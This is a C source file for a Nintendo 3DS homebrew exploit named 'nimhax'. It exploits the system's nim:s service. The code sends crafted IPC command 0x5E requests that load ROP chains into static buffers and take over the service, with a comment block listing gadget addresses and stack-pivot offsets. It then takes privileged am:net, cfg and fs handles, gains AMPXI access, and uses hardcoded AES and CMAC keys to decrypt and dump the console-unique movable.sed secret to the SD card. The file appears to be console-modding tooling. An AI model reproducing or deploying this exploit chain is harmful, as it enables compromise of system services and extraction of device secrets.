#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <3ds.h>

#include "common_errors.h"

#include "../utils/crypto.h"
#include "../utils/fileio.h"

Result initialize_ctr_httpwn(const char* serverconfig_localpath);

static Handle nim_amHandle = 0;
static Handle nim_cfgHandle = 0;
static Handle nim_fsHandle = 0;

static Handle pxiam9_handle = 0;

static Handle nimsHandle = 0;
static int nimsRefCount = 0;

static u8 ivskey[16] = {0xd7, 0x72, 0xeb, 0x0e, 0x23, 0x9c, 0xfa, 0xb8, 0xbb, 0x73, 0xdd, 0x4a, 0x8d, 0x8e, 0xdc, 0x34};
static u8 ivscmackey[16] = {0xfc, 0x19, 0xff, 0x86, 0x07, 0x78, 0x76, 0x2a, 0xea, 0x8d, 0xe4, 0xc1, 0xf2, 0x84, 0xe1, 0xae};

// ------------- nim things --------------

/*
0x1780A8 SP after a normal return of the affected user-agent set function

0x00120bb4 : ldmda r4, {r4, ip, sp, lr, pc}

new user-agent setting and stack space layout, with padded spaces to read better:
<--------------------------user-agent buffer--------------------------> <-misc-> <--r4-------pc-->
FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 10821700 DEADDEAD 848B1700 C1E11400 BFE11400 9C801700 B40B1200

0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x4 // static buffer 1 (desc index 2) - ROP buffer (+0x100 for ROP: 0x178B84)
0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x1004 // static buffer 2 (desc index 1) - Stack pivot, recovery of workflow (0x179A84)
0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x1904 // static buffer 6 (desc index 0) - IPC response sample (0x17A384)

clear things up, in the indicated order:
0x1780A8+0x28+0x140 // nim specific object (0x178210), clear with (0x12B818+1)
0x1780A8+0x28+0x1F8 // httpc object (0x1782C8), clear with (0x12C8B8+1 // skip R0 setup using R4 instead with +4, will continue ROP with POP {R4, PC})
0x1780A8+0x28+0x268+0x138 // lock (0x178470), unlock with (0x130F02+1 // +2 to skip push and get a ROP pop {r4, pc} at end)
Call (0x12CFD0+1) with R0 = 0 // need setup LR

perform IPC response setup on cmdbuf

0x15673C am:net handle
0x156750 cfg:s handle
0x1566AC fs:USER handle (jumping to 0x130C8E+1 will get it on R0 and POP {R4, PC})

escape from ROP back to proper flow, pivot to SP 0x1780A8+0x28+0x268+0x368+0x28+0x36C (0x178A34) and PC 0x105688+1 (It will naturally POP back out R4-R7, PC). This function is void, R0 setup unneeded. IPC response will happen on return
*/

// 0x5E, ROP edition
// give me the lennies
// we are going to ROP chain and restore flow to nim:s twice
// we also take over the service temporarely
// we clean up always leaving the service in a stable state
// like nothing happened at all

static Result _nimsInit() {
	Result res;
	if (AtomicPostIncrement(&nimsRefCount)) return 0;
	res = srvGetServiceHandle(&nimsHandle, "nim:s");
	if (R_FAILED(res)) AtomicDecrement(&nimsRefCount);

	return res;
}

static void _nimsExit(void) {
	if (AtomicDecrement(&nimsRefCount)) return;
	svcCloseHandle(nimsHandle);
}

static void clear_handles(void) {
	svcCloseHandle(nim_amHandle);
	svcCloseHandle(nim_cfgHandle);
	svcCloseHandle(nim_fsHandle);

	svcCloseHandle(pxiam9_handle);
}

extern const u32 NIMS_0x5E_IPC_PwnedReplyBase[];
extern const u32 NIMS_0x5E_IPC_PwnedReplyBase_size;

extern const u32 NIMS_0x5E_StackRecoveryPivot[];
extern const u32 NIMS_0x5E_StackRecoveryPivot_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part1[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part1_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part2[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part2_size;

extern const u32 NIMS_0x5E_ROP_TakeOver[];
extern const u32 NIMS_0x5E_ROP_TakeOver_size;

static Result NIMS_PWNCMD0x5EPart1(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 6); // normally, it should be 0x005e0000, but there's no checks in argumentless cmds, so we'll abuse this to shove a ROP into staticbufs for second stage after httpwn causes stage 1 to run
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part1_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part1;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_IPC_PwnedReplyBase_size, 0); // max 0x40
	cmdbuf[4] = (u32)NIMS_0x5E_IPC_PwnedReplyBase;
	cmdbuf[5] = IPC_Desc_StaticBuffer(NIMS_0x5E_StackRecoveryPivot_size, 1); // max 0x400
	cmdbuf[6] = (u32)NIMS_0x5E_StackRecoveryPivot;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 1, 4)) {
		if (haxran) *haxran = false;
		return (Result)cmdbuf[1];
	}

	if (haxran) *haxran = true;
	*amGetSessionHandle() = cmdbuf[3];
	nim_amHandle  = cmdbuf[3];
	nim_cfgHandle = cmdbuf[4];
	nim_fsHandle  = cmdbuf[5];

	return (Result)cmdbuf[1];
}

static Result NIMS_PWNCMD0x5EPart2(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 4);
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part2_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part2;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_TakeOver_size, 0); // patched static buf
	cmdbuf[4] = (u32)NIMS_0x5E_ROP_TakeOver;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

static Result AMNET_GetDeviceCert(u8 *buffer)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x818, 1, 2); // 0x08180042
	cmdbuf[1] = 0x180;
	cmdbuf[2] = IPC_Desc_Buffer(0x180, IPC_BUFFER_W);
	cmdbuf[3] = (u32)buffer;

	if(R_FAILED(ret = svcSendSyncRequest(nim_amHandle))) 
		return ret;

	return (Result)cmdbuf[1];
}

static Result AM_GetCiaRequiredSpacePwn(Handle fileHandle, Handle* pxiam9_handle)
{
	Result ret = 0;
	volatile u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x40D,1,2); // 0x040D0042
	cmdbuf[1] = MEDIATYPE_SD;
	cmdbuf[2] = IPC_Desc_SharedHandles(1);
	cmdbuf[3] = fileHandle;

	if(R_FAILED(ret = svcSendSyncRequest(nim_amHandle))) return ret;

	if(cmdbuf[0] != IPC_MakeHeader(0x40D,1,2)) return (Result)cmdbuf[1];

	if(pxiam9_handle) *pxiam9_handle = (Handle)cmdbuf[3];
	else svcCloseHandle((Handle)cmdbuf[3]);

	return (Result)cmdbuf[1];
}

static Result AMPXI_GetDeviceID(volatile int* internal_error, volatile u32* device_id) {
	Result ret = 0;
	volatile u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x3C,0,0); // 0x003C0000

	if(R_FAILED(ret = svcSendSyncRequest(pxiam9_handle))) return ret;

	if(internal_error) *internal_error = (int)cmdbuf[2];
	if(device_id) *device_id = cmdbuf[3];

	return (Result)cmdbuf[1];
}

static Result NIMS_GetErrorCode(int* error_code) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x31, 0, 0); // 0x00310000

	if (R_FAILED(ret = svcSendSyncRequest(*nimsGetSessionHandle()))) return ret;

	if (error_code) *error_code = cmdbuf[2];

	return (Result)cmdbuf[1];
}

Result funWithNim() {
	Result ret;
	bool haxran = false;

	ret = _nimsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init nim:s. 0x%08lx\n", ret);
		return ret;
	}

	ret = NIMS_PWNCMD0x5EPart1(&haxran);
	printf("nims_0x5E part1 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}
	ret = NIMS_PWNCMD0x5EPart2(&haxran);
	printf("nims_0x5E part2 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		clear_handles();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	ret = AM_GetCiaRequiredSpacePwn(nimsHandle, &pxiam9_handle);
	printf("AM_GetCiaRequiredSpacePwn 0x%08lx\n", ret);
	if (R_FAILED(ret)) {
		clear_handles();
		_nimsExit();
		return ret;
	}

	volatile int internal_error = 0;
	volatile u32 device_id = 0;
	ret = AMPXI_GetDeviceID(&internal_error, &device_id);
	printf("AMPXI_GetDeviceID 0x%08lx\n", ret);
	if (R_FAILED(ret) || internal_error) {
		printf("- error: %i\n", internal_error);
		clear_handles();
		_nimsExit();
		return ret;
	}
	printf("We got AMPXI!\n");
	printf("Device ID: 0x%08lx\n", device_id);

	// create a few temporary scopes to decrease this function's total stack
	// mainly since we dont need multiple bigger buffers alive through out the whole function

	{
		printf("Testing am:net...\n");
		u8 ctcert[0x180];
		ret = AMNET_GetDeviceCert(ctcert);
		if (R_FAILED(ret)) printf("AMNET_GetDeviceCert 0x%08lx\n", ret);
		else printf("AMNET_GetDeviceCert works!\nYou have am:net!\n");
	}
	
	printf("Dumping movable.sed...\n");
	u8 msed[0x120];

	// more temporary scopes
	{
		FS_IntegrityVerificationSeed ivs;
		u8 cmac[0x10];
		u8 sha256[0x20];
		fsUseSession(nim_fsHandle);
		ret = FSUSER_ExportIntegrityVerificationSeed(&ivs);
		printf("fsIVSexport 0x%08lx\n", ret);
		fsEndUseSession();
		
		if (R_FAILED(ret)){
			printf("Movable.sed dump skipped, no archive access\n");
			clear_handles();
			_nimsExit();
			return ret;
		}

		printf("Decrypting movable and checking CMAC...\n");
		decryptAES(ivs.movableSed, 0x120, ivskey, ivs.aesCbcMac, msed);
		calculateSha256(msed, 0x110, sha256);
		calculateCMAC(sha256, 0x20, ivscmackey, cmac);
		ret = memcmp(ivs.aesCbcMac, cmac, 0x10) ? MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NO_DATA) : 0;
		
		if (R_FAILED(ret)) {
			printf("Bad CMAC, movable probably corrupted :(\n");
			clear_handles();
			_nimsExit();
			return ret;
		}
	}

	printf("CMAC good!\n");
	printf("Dumping movable.sed to sd root...\n");

	FILEIO *f = fileio_open("/movable.sed", "wb");
	if (!f) {
		printf("Failed to open movable.sed on sd for dump.\n");
		clear_handles();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_OUTOFRESOURCE, RM_APPLICATION, RD_NO_DATA);
	}
	
	int totalwritten = fileio_write(msed, 1, 0x120, f);
	fileio_close(f);

	if(totalwritten == 0x120) {
		printf("Movable.sed dumped!\n");
		ret = 0;
	} else {
		printf("Msed dump error.\n");
		ret = MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_INVALID_SIZE);
	}

	clear_handles();
	_nimsExit();
	return ret;
}
// ---------------------------------------

static Result check_nim_version() {

	Result ret = amInit();
	if(R_FAILED(ret))
		return ret;

	u64 nim_tid = 0x0004013000002C02LLU;
	AM_TitleEntry title_entry;

	ret = AM_GetTitleInfo(MEDIATYPE_NAND, 1, &nim_tid, &title_entry);

	if(R_SUCCEEDED(ret)) {
		if (title_entry.version != 14341) ret = RES_INVALID_VALUE;
		else ret = 0;
	}

	amExit();
	return ret;
}

// ---------------------------------------
// because there was no function to get current cfg handle
// copied some functions from ctrulib and added a new

static Handle cfgHandle;
static int cfgRefCount;

static Result _cfgInit(void)
{
	Result ret;

	if (AtomicPostIncrement(&cfgRefCount)) return 0;

	// cfg:i has the most commands, then cfg:s, then cfg:u
	ret = srvGetServiceHandle(&cfgHandle, "cfg:i");
	if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfgHandle, "cfg:s");
	//if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfguHandle, "cfg:u"); // not useful here
	if(R_FAILED(ret)) AtomicDecrement(&cfgRefCount);

	return ret;
}

static void _cfgExit(void)
{
	if (AtomicDecrement(&cfgRefCount)) return;
	svcCloseHandle(cfgHandle);
}

static Result _CFG_GetConfigInfoBlk4(u32 size, u32 blkID, volatile void* outData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x401,2,2); // 0x4010082
	cmdbuf[1] = size;
	cmdbuf[2] = blkID;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_W);
	cmdbuf[4] = (u32)outData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFG_SetConfigInfoBlk4(u32 size, u32 blkID, volatile const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x402,2,2); // 0x4020082
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[4] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFGI_CreateConfigInfoBlk(u32 size, u32 blkID, u16 blkFlags, const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x804,3,2); // 0x80400C2
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = blkFlags;
	cmdbuf[4] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[5] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

#define CFG_BLKID_NOT_FOUND MAKERESULT(RL_PERMANENT, RS_WRONGARG, RM_CONFIG, RD_NOT_FOUND)

static Result try_ensure_npns() {
	Result ret = _cfgInit();
	if (R_FAILED(ret)) {
		printf("Failed to init cfg. Assuming NPNS is set.\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if exploit fails if able without updating.\n");
		return 0;
	}

	static const char expected_npns_server_selector[4] = {'L', '1', 0, 0};
	static const char dummy_npns_token[0x28] = {'A', 0};
	volatile char npns_server_selector[4] = {0};
	volatile char npns_token[0x28] = {0};

	ret = _CFG_GetConfigInfoBlk4(4, 0x150002, &npns_server_selector);
	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(4, 0x150002, 0xE, expected_npns_server_selector);
		npns_server_selector[0] = 'L';
	}

	if (R_SUCCEEDED(ret)) ret = _CFG_GetConfigInfoBlk4(0x28, 0xF0006, &npns_token);

	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(0x28, 0xF0006, 0xC, dummy_npns_token);
		npns_token[0] = 'A';
	}

	if (R_FAILED(ret)) {
		printf("Cannot guarantee NPNS is set!!\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if pwn fails if able without updating.\n");
		return 0; // we'll try as well and hope
	}

	if (npns_token[0] == 0) {
		printf("Invalid NPNS Token, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(0x28, 0xF0006, dummy_npns_token);
	}

	if (R_SUCCEEDED(ret) && npns_server_selector[0] != 'l' && npns_server_selector[0] != 'L') {
		printf("Invalid NPNS Server selector, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(4, 0x150002, expected_npns_server_selector);
	}

	_cfgExit();
	return ret;
}

// ---------------------------------------

static Result try_ensure_nim_tokens() {
	// init nim the standard way first
	Result ret = MAKERESULT(RL_FATAL, RS_OUTOFRESOURCE, RM_APPLICATION, RD_OUT_OF_MEMORY);
	void* mem = linearAlloc(0x200000);

	if (!mem) {
		printf("Failed to allocate linear memory.\n");
		return ret;
	}

	ret = nimsInit(mem, 0x200000);
	if (R_FAILED(ret)) {
		int error;
		Result _ret = NIMS_GetErrorCode(&error);
		if (R_FAILED(_ret)) printf("Failed to init nim:s and get error code. %08lX / %08lX\n", ret, _ret);
		else printf("Failed to init nim:s. %08lX / %03i-%04i\n", ret, error / 10000, error % 10000);
	}
	nimsExit();
	linearFree(mem);
	return ret;
}

extern PrintConsole topScreen, bottomScreen;

int nimhax(void)
{
	char *serverconfig_localpath = "nim_config.xml";
	Result ret = 0;

	//consoleSelect(&topScreen);

	printf("nimhax with ctr-httpwn\n");
	printf("am11pwn with nimhax\n\n");

	ret = check_nim_version();

	if(R_SUCCEEDED(ret)) {
		printf("Initializing nim...\n");
		try_ensure_nim_tokens(); // may not be the reason to lose hope yet if fail
	} else {
		if (ret == RES_INVALID_VALUE) 
			printf("NIM version invalid, expecting v14341\n");
		else
			printf("Error while trying to check nim version\n");
	}

	if (R_SUCCEEDED(ret)) {
		printf("Trying to ensure npns tokens...\n");
		ret = try_ensure_npns();
	}

	if (R_FAILED(ret)) {
		printf("NPNS is invalid but we failed to fix it!!\n");
		printf("res = 0x%08lx\n", ret);
	}

	gfxFlushBuffers();
	gfxSwapBuffers();
	gspWaitForVBlank();

	if (R_SUCCEEDED(ret)) {
		printf("Initializing ctr-httpwn...\n");

		//consoleSelect(&topScreen);

		ret = initialize_ctr_httpwn(serverconfig_localpath);

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();

		//consoleSelect(&bottomScreen);

		printf("Initialized res = 0x%08lx\n", ret);
	}

	if(R_SUCCEEDED(ret)) ret = funWithNim();

	if(R_SUCCEEDED(ret)) {
		printf("Done.\n");
	}
	else {
		if (ret == RES_APT_CANCELED)
			{/* ignore */}
		else if (ret == RES_USER_CANCELED)
			printf("User Canceled.\n");
		else printf("Failed.\n");
		return 0;
	}
	return 1;
/*
	if (ret != RES_APT_CANCELED) {

		printf("\nPress the START button to exit.\n");
		while (1)
		{
			gfxFlushBuffers();
			gfxSwapBuffers();
			gspWaitForVBlank();

			hidScanInput();

			u32 kDown = hidKeysDown();
			if (kDown & KEY_START)
				break; // break in order to return to hbmenu
		}
	}
	return 0;
*/
}
